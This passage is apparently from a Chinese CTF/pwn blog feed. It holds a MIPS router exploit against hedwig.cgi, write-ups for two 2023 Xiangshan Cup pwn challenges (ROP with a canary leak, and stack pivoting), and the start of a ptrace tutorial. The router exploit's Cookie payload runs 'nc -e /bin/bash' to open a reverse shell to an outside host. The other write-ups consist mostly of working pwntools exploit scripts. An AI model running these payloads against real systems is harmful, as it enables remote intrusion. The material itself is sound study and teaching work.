0x4C0+var_s18($sp)</span><br><span class="line">.text:00409A3C D4 04 B5 8F                   lw      $s5, 0x4C0+var_s14($sp)</span><br><span class="line">.text:00409A40 D0 04 B4 8F                   lw      $s4, 0x4C0+var_s10($sp)</span><br><span class="line">.text:00409A44 CC 04 B3 8F                   lw      $s3, 0x4C0+var_sC($sp)</span><br><span class="line">.text:00409A48 C8 04 B2 8F                   lw      $s2, 0x4C0+var_s8($sp)</span><br><span class="line">.text:00409A4C C4 04 B1 8F                   lw      $s1, 0x4C0+var_s4($sp)</span><br><span class="line">.text:00409A50 C0 04 B0 8F                   lw      $s0, 0x4C0($sp)</span><br><span class="line">.text:00409A54 08 00 E0 03                   jr      $ra</span><br><span class="line">.text:00409A58 E8 04 BD 27                   addiu   $sp, 0x4E8</span><br></pre></td></tr></table></figure><p>加载的libc里去找些gadget</p><p><img src="/2023/10/22/first-router/image-20231027115258429.png" alt="image-20231027115258429"></p><p><code>mipsrop.stackfinder()</code>寻找将堆栈地址放入寄存器的gadget</p><p><img src="/2023/10/22/first-router/image-20231027121821119.png" alt="image-20231027121821119"></p><p>sp+0x10给为system参数地址，s0处设置为system即可</p><p>system在0x053200会被00截断</p><p>需要找一下把s0减少或者加上一些数的gadget</p><p><code>mipsrop.find(&quot;addiu $s0&quot;)</code></p><p><img src="/2023/10/22/first-router/image-20231027123224282.png" alt="image-20231027123224282"></p><p>把s5设为0x159cc的gadget，s0设为system-1 ,反弹shell即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">libcbase = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span>-<span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x158c8</span></span><br><span class="line">gadget2 = <span class="number">0x159cc</span></span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;</span></span><br><span class="line">padding = cyclic(<span class="number">0x3cd</span>)</span><br><span class="line">padding += p32(libcbase + system_addr_1) <span class="comment"># s0</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4</span></span><br><span class="line">padding += p32(libcbase+gadget2)         <span class="comment"># s5</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp</span></span><br><span class="line">padding += p32(libcbase + gadget1)       <span class="comment"># ra</span></span><br><span class="line">padding += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">padding += cmd</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;context&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(padding)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>模拟机里用环境变量模拟传递参数</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;100&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat context`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;/hedwig.cgi&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;uid=1234&quot;</span>|./gdbserver.mipsle :1234 /htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure><p>宿主机监听端口获得shell</p><p><img src="/2023/10/22/first-router/image-20231027125128566.png" alt="image-20231027125128566"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">libcbase = <span class="number">0x77f34000</span></span><br><span class="line">system_addr_1 = <span class="number">0x53200</span>-<span class="number">1</span></span><br><span class="line">gadget1 = <span class="number">0x158c8</span></span><br><span class="line">gadget2 = <span class="number">0x159cc</span></span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.100.254 9999&#x27;</span></span><br><span class="line">padding = cyclic(<span class="number">0x3cd</span>)</span><br><span class="line">padding += p32(libcbase + system_addr_1) <span class="comment"># s0</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s1</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s2</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s3</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s4</span></span><br><span class="line">padding += p32(libcbase+gadget2)         <span class="comment"># s5</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s6</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># s7</span></span><br><span class="line">padding += <span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span>                        <span class="comment"># fp</span></span><br><span class="line">padding += p32(libcbase + gadget1)       <span class="comment"># ra</span></span><br><span class="line">padding += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">padding += cmd</span><br><span class="line">url=<span class="string">&#x27;http://192.168.100.2:4321/hedwig.cgi&#x27;</span></span><br><span class="line">header = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;uid=&#x27;</span>+padding,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;100&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;6rx3r&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span>&#125;</span><br><span class="line">requests.post(url=url, headers=header, data=data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 香山杯</title>
      <link href="/2023/10/15/2023xsb/"/>
      <url>/2023/10/15/2023xsb/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1dEHXG4QZIISKDtTgL3ZqmQ">https://pan.baidu.com/s/1dEHXG4QZIISKDtTgL3ZqmQ</a><br>提取码：q407</p><h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>第一次遇见cpython的题，无头苍蝇一样乱撞，坐大牢</p><p>给了app.cpython-37m-x86_64-linux-gnu.so和main.py两个文件</p><p>最大的问题就是调试环境(跑不起来可太难受了)，题目给的main.py需要把<code>os.mkdir(folder_name)</code>改为<code>os.makedirs(folder_name)</code></p><p>3.37的cpython似乎(试了其他版本都没跑起来)只能用3.37才能跑了起来，python main.py就可以跑起来了</p><p>调试就直接attach到python进程上，python进程地址空间可以看到cpython.so被加载进来了</p><p><img src="/2023/10/15/2023xsb/image-20231015221314843.png" alt="image-20231015221314843"></p><p>漏洞主要出现在<code>_pyx_pw_3app_3app_main的_pyx_f_3app_Welcome2Pwnthon</code>(剩余两个函数的长度真的要命)</p><p><img src="/2023/10/15/2023xsb/image-20231015222245793.png" alt="image-20231015222245793"></p><p>看下保护</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22:~/share/match/2023xsb/pwthon_34a4c98f089057330b960f4eba8ae404$ checksec ./app.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/2023xsb/pwthon_34a4c98f089057330b960f4eba8ae404/app.cpython-37m-x86_64-linux-gnu.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RPATH:    b&#x27;/home/xiran/anaconda3/envs/cython/lib&#x27;</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>白给的基地址这样就可以有pop rdi这样的gadget用，格式化字符串漏洞用来泄露canary(也可以泄露libc地址但是远程栈环境极可能不一样，选择了rop来泄露libc地址)，栈溢出来rop来泄露libc后返回到_pyx_f_3app_Welcome2Pwnthon，再次溢出getshell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">cpython_so=ELF(<span class="string">&#x27;./app.cpython-37m-x86_64-linux-gnu.so&#x27;</span>)</span><br><span class="line">io = process(argv=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;main.py&#x27;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">bstr = <span class="keyword">lambda</span> x   : <span class="built_in">str</span>(x).encode()</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbpie</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,x)</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># b(&#x27;b __printf_chk&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27; gift &#x27;</span>)</span><br><span class="line">cpython_so_base=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&quot;0x7fad184ef8b0&quot;</span>)),<span class="number">16</span>)-<span class="number">0x38b0</span>-(<span class="number">0x7f7af04ec000</span> -<span class="number">0x7f7af04e9000</span>)</span><br><span class="line">p(<span class="string">&#x27;cpython&#x27;</span>,cpython_so_base)</span><br><span class="line"><span class="comment">#0x0000000000003f8f : pop rdi ; ret</span></span><br><span class="line">poprdi=cpython_so_base+<span class="number">0x0000000000003f8f</span></span><br><span class="line">ret=<span class="number">0x000000000000301a</span>+cpython_so_base</span><br><span class="line">app_Welcome2Pwnthon=<span class="number">0x99F0</span>+cpython_so_base</span><br><span class="line">sl(<span class="string">b&#x27;%p&#x27;</span>*<span class="number">14</span>)<span class="comment">#%$p会crash</span></span><br><span class="line">x=rl()</span><br><span class="line">x=io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">canary=<span class="built_in">int</span>((x.decode()).split(<span class="string">&quot;0x&quot;</span>)[-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canry&#x27;</span>,canary)</span><br><span class="line">pay=flat(</span><br><span class="line">    cyclic(<span class="number">0x108</span>),</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">#返回时多pop了rdx</span></span><br><span class="line">    poprdi,</span><br><span class="line">    cpython_so.got[<span class="string">&#x27;puts&#x27;</span>]+cpython_so_base,</span><br><span class="line">    cpython_so.plt[<span class="string">&#x27;puts&#x27;</span>]+cpython_so_base,</span><br><span class="line">    app_Welcome2Pwnthon    </span><br><span class="line">)</span><br><span class="line">sl(pay)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcbase=puts_ad-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">sl(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">pay=flat(</span><br><span class="line">    cyclic(<span class="number">0x108</span>),</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">#返回时多pop了rdx</span></span><br><span class="line">    poprdi,</span><br><span class="line">    bin_sh_addr,</span><br><span class="line">    ret,</span><br><span class="line">    system</span><br><span class="line">)</span><br><span class="line">sl(pay)</span><br><span class="line"><span class="comment"># sl(b&#x27;cat *fl*&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2023/10/15/2023xsb/image-20231015220838627.png" alt="image-20231015220838627"></p><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>常规栈迁移，不过题目给的bss地址太靠近上面的只读段了，所以不能返回_start()，可以返回到main</p><p>第二次read(0, &amp;sskd, 0x20uLL);此时栈已经是sskd附件了，raed可以改掉read自己的返回地址进行rop</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    debug = <span class="number">0</span></span><br><span class="line">    remotestr=<span class="string">&quot;&quot;</span></span><br><span class="line">    remotestr=remotestr.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io = remote(remotestr[<span class="number">0</span>],<span class="built_in">int</span>(remotestr[<span class="number">1</span>],<span class="number">10</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="number">1</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">bstr = <span class="keyword">lambda</span> x   : <span class="built_in">str</span>(x).encode()</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbpie</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># db(0x401211)</span></span><br><span class="line"><span class="comment"># db(0x040124B)</span></span><br><span class="line">db(<span class="number">0x0401241</span>)</span><br><span class="line"><span class="comment"># db(0x4012A3)</span></span><br><span class="line">sskd=<span class="number">0x04050A0</span></span><br><span class="line">pay=flat(</span><br><span class="line">        <span class="number">0x0000000000401353</span>,</span><br><span class="line">        elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        elf.sym[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        <span class="number">0x0401264</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;in!\n&#x27;</span>,pay)</span><br><span class="line">sa(<span class="string">b&#x27;number&#x27;</span>,p32(<span class="number">0x12345678</span>))</span><br><span class="line">pay=cyclic(<span class="number">0x30</span>)+p64(sskd-<span class="number">8</span>) +p64(<span class="number">0x040124b</span>)</span><br><span class="line">sa(<span class="string">b&#x27;oLa&#x27;</span>,pay)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay=flat(</span><br><span class="line">         <span class="number">0x0000000000401353</span>,</span><br><span class="line">         bin_sh_addr,</span><br><span class="line">         system</span><br><span class="line">)</span><br><span class="line">sa(<span class="string">b&#x27;in!\n&#x27;</span>,pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>透过一道pwn题看ptrace系统调用</title>
      <link href="/2023/10/14/2022-ciscn-syscall-ptrace/"/>
      <url>/2023/10/14/2022-ciscn-syscall-ptrace/</url>
      
        <content type="html"><![CDATA[<h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p>NB的系统调用，常用的strace和gdb都是用ptrace实现的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">            <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>参数复杂，其他可以查手册(man 2 ptrace)</p><blockquote><p>手册里，tracer就是调试程序，tracee就是被调试程序，英语一般用-er和-ee来表示主动和被动的关系，例如：employer就是老板，employee就是苦逼的打工人</p></blockquote><p><strong>request</strong>指定跟踪的动作</p><p><em>PTRACE_TRACEME</em>：此进程将被父进程跟踪，任何信号（除了 <code>SIGKILL</code>）都会暂停子进程，接着阻塞于 <code>wait()</code> 等待的父进程被唤醒。子进程内部对 <code>exec()</code> 的调用将发出 <code>SIGTRAP</code> 信号，这可以让父进程在子进程新程序开始运行之前就完全控制它。返回信号被wait之类函数捕获到后并不是信号的值，库提供了宏去解析获得，<code>man 2 wait</code>查看 (see also strsignal(3))</p><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231014232059820.png" alt="image-20231014232059820"></p><p><em>PTRACE_ATTACH</em>: 附加到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次 PTRACE_TRACEME 操作</p><p><em>PTRACE_SYSCALL</em>: 调试进程每次进入或者退出系统调用时都会触发一次<code>SIGTRAP</code>信号，</p><p><em>PTRACE_GETREGS</em>：获取通用寄存器值</p><p><em>PTRACE_SETREGS</em> : 设置通用寄存器值</p><p><em>PTRACE_SINGLESTEP</em>：每执行完一次指令之后会触发一次sigtrap,支持获取当前进程的内存&#x2F;寄存器状态。gdb的单步指令通过该选项实现。</p><ul><li>硬件实现单步:处理器支持单步模式(x86通过设置EFLAGS寄存器第8位的TF标志实现)</li><li>软件实现单步:每条指令后面都插入一条断点指令(x86 int3[0xcc烫烫烫])</li><li>断点的实现可以在指令处插入int3，当被调试的程序运行到断点的时候，产生SIGTRAP信号，把指令位置和调试器维护的断点集合(一般为链表)比较判断SIGTRAP是否由断点产生，把原来指令恢复，设置pc寄存器，就可以继续</li></ul><p><em>PTRACE_CONT</em>：继续运行之前停止的子进程。可同时向子进程交付指定的信号(data参数传递)</p><p><strong>pid</strong>表示要跟踪的进程pid</p><p><strong>addr</strong>表示进程的内存地址</p><p><strong>data</strong> 根据前面设置的requet选项而变化，存放读取出的或者要写入的数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">pid_t</span> child;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="type">int</span> orig_rax;</span><br><span class="line"></span><br><span class="line">  child = fork();</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//被调试</span></span><br><span class="line">    execl(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;/bin/ls&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    wait(&amp;status); <span class="comment">// 接收被子进程发送过来的 SIGTRAP 信号</span></span><br><span class="line">    <span class="comment">//这一次是execve系统调用引起的，调用成功不返回</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orig_rax: %llx\t&quot;</span>, regs.orig_rax); <span class="comment">// 打印rax寄存器的值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax: %llx\n&quot;</span>, regs.rax);           <span class="comment">// 打印rax寄存器的值</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 1. 发送 PTRACE_SYSCALL 命令给被跟踪进程</span></span><br><span class="line">      <span class="comment">// (调用系统调用前，可以获取系统调用的参数)</span></span><br><span class="line">      ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      wait(&amp;status); <span class="comment">// 接收被子进程发送过来的 SIGTRAP 信号(进入系统调用触发)</span></span><br><span class="line">      <span class="keyword">if</span> (WIFEXITED(status)) &#123; <span class="comment">// 如果子进程退出了, 那么终止跟踪</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;--------------&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, status);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">// 获取被跟踪进程寄存器的值</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;orig_rax: %llx\t&quot;</span>, regs.orig_rax); <span class="comment">// 打印rax寄存器的值</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;rax: %llx\t&quot;</span>, regs.rax);           <span class="comment">// 打印rax寄存器的值</span></span><br><span class="line">      <span class="comment">// 2. 发送 PTRACE_SYSCALL 命令给被跟踪进程</span></span><br><span class="line">      <span class="comment">// (调用系统调用后，可以获取系统调用的返回值)</span></span><br><span 